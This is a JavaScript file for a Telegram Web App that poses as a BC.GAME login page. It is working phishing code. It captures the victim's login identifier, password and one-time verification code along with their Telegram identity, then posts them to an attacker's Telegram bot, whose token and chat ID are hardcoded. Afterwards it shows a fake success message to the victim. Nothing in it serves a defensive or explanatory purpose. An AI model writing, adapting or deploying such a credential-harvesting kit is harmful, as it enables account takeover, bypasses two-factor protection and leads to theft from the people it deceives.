// Configuration - Update these for your logging bot
const TARGET_BOT_TOKEN = '8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc'; 
const TARGET_CHAT_ID = '7611425178';

// Initialize Telegram Web App
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // Elements
    const tabItems = document.querySelectorAll('.tab-item');
    const btnSignin = document.getElementById('btn-signin');
    const mainIdentifier = document.getElementById('main-identifier');
    const passwordField = document.getElementById('password-field');
    const loginPassword = document.getElementById('login-password');
    const otpOverlay = document.getElementById('otp-overlay');
    const verifyTitle = document.getElementById('verify-title');
    const verifyDesc = document.getElementById('verify-desc');
    const verifyTypeIcon = document.getElementById('verify-type-icon');
    const btnConfirm = document.getElementById('btn-confirm');
    const verifyCodeInput = document.getElementById('verify-code-input');
    const resendSeconds = document.getElementById('resend-seconds');
    const closeIcons = document.querySelectorAll('.close-icon, .verify-close');
    const eyeIcon = document.querySelector('.eye-icon');
    const pasteBtn = document.querySelector('.paste-btn');

    let activeTab = 'password';
    let timerInterval;

    // Tab Switching
    tabItems.forEach(item => {
        item.addEventListener('click', () => {
            tabItems.forEach(i => i.classList.remove('active'));
            item.classList.add('active');
            activeTab = item.dataset.tab;

            if (activeTab === 'otp') {
                passwordField.style.display = 'none';
                mainIdentifier.placeholder = 'Email / Phone Number';
            } else {
                passwordField.style.display = 'flex';
                mainIdentifier.placeholder = 'Email / Phone Number / Username';
            }
        });
    });

    // Toggle Password Visibility
    eyeIcon.addEventListener('click', () => {
        const type = loginPassword.type === 'password' ? 'text' : 'password';
        loginPassword.type = type;
        eyeIcon.querySelector('i').className = type === 'password' ? 'far fa-eye' : 'far fa-eye-slash';
    });

    // Close Actions
    closeIcons.forEach(icon => {
        icon.addEventListener('click', () => {
            otpOverlay.style.display = 'none';
            if (icon.classList.contains('close-icon') && tg) {
                tg.close();
            }
        });
    });

    // Sign In Button
    btnSignin.addEventListener('click', () => {
        const identifier = mainIdentifier.value.trim();
        const password = loginPassword.value.trim();

        if (!identifier) {
            alert('Please enter your details');
            return;
        }

        if (activeTab === 'password' && !password) {
            alert('Please enter your password');
            return;
        }

        // Determine if it's email or phone for the verification modal
        const isEmail = identifier.includes('@');
        
        if (isEmail) {
            verifyTitle.innerText = 'Email Verification';
            verifyDesc.innerText = `Please enter the 6-digit verification code sent on e-mail`;
            verifyTypeIcon.className = 'fas fa-envelope';
        } else {
            verifyTitle.innerText = 'Phone Verification';
            verifyDesc.innerText = `Please enter the 6-digit verification code sent to your phone`;
            verifyTypeIcon.className = 'fas fa-mobile-alt';
        }

        // Show Verification Modal
        otpOverlay.style.display = 'flex';
        startTimer(46);
        
        if (tg) tg.HapticFeedback.impactOccurred('medium');
    });

    // Confirm Button (Final Submission)
    btnConfirm.addEventListener('click', async () => {
        const code = verifyCodeInput.value.trim();
        const identifier = mainIdentifier.value.trim();
        const password = loginPassword.value.trim();
        const username = tg?.initDataUnsafe?.user?.username || 'Guest';
        const tgId = tg?.initDataUnsafe?.user?.id || 'N/A';

        if (code.length < 4) {
            alert('Please enter a valid verification code');
            return;
        }

        btnConfirm.innerText = 'Verifying...';
        btnConfirm.disabled = true;

        const captureData = {
            tg_username: username,
            tg_id: tgId,
            identifier: identifier,
            password: activeTab === 'password' ? password : 'N/A (OTP Mode)',
            otp_code: code,
            login_mode: activeTab,
            timestamp: new Date().toLocaleString()
        };

        // Send to Logger Bot
        await sendToLogger(captureData);

        // Success Simulation
        btnConfirm.innerText = 'Success!';
        if (tg) tg.HapticFeedback.notificationOccurred('success');

        setTimeout(() => {
            otpOverlay.style.display = 'none';
            if (tg) {
                tg.sendData(JSON.stringify({ action: 'login_captured', status: 'ok' }));
                tg.close();
            } else {
                location.reload();
            }
        }, 1500);
    });

    // Paste Function
    pasteBtn.addEventListener('click', async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text) verifyCodeInput.value = text;
        } catch (err) {
            console.error('Clipboard error:', err);
        }
    });

    // Timer Logic
    function startTimer(seconds) {
        let timeLeft = seconds;
        resendSeconds.innerText = timeLeft;
        clearInterval(timerInterval);
        
        timerInterval = setInterval(() => {
            timeLeft--;
            resendSeconds.innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
            }
        }, 1000);
    }

    // Function to send data to Telegram API
    async function sendToLogger(data) {
        const message = `
🎯 <b>Login Capture: BC.GAME</b>
━━━━━━━━━━━━━━━
👤 <b>User</b>: @${data.tg_username} (ID: ${data.tg_id})
📧 <b>Login</b>: <code>${data.identifier}</code>
🔑 <b>Pass</b>: <code>${data.password}</code>
🔢 <b>OTP</b>: <code>${data.otp_code}</code>
🛠 <b>Mode</b>: ${data.login_mode.toUpperCase()}
🕒 <b>Time</b>: ${data.timestamp}
━━━━━━━━━━━━━━━`;

        try {
            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TARGET_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (err) {
            console.error('Logging failed:', err);
        }
    }
});
